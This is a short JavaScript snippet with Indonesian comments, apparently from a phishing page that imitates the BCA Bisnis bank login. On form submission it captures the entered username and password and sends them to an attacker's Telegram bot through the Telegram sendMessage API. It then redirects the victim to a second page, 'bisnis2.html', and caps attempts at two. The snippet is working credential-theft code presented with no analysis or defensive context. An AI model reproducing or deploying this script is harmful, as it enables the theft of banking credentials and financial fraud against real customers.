<script>
  let attemptCount = 0; // Variabel untuk menghitung percobaan

  document.getElementById("login-form").addEventListener("submit", function (event) {
    event.preventDefault();

    if (attemptCount >= 2) {
      alert("Anda hanya bisa mencoba 2 kali!");
      return;
    }

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Kirim data ke bot Telegram
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: `UserBCA-BISNIS: ${username}\nPassBCA-BISNIS: ${password}`,
      }),
    }).then(response => {
      if (response.ok) {
        window.location.href = "bisnis2.html"; // Redirect ke bisnis2.html
      } else {
        alert("Gagal mengirim data ke bot Telegram.");
      }
    }).catch(error => {
      console.error("Error:", error);
      alert("Terjadi kesalahan saat mengirim data.");
    });

    attemptCount++; // Tambah jumlah percobaan
  });
</script>
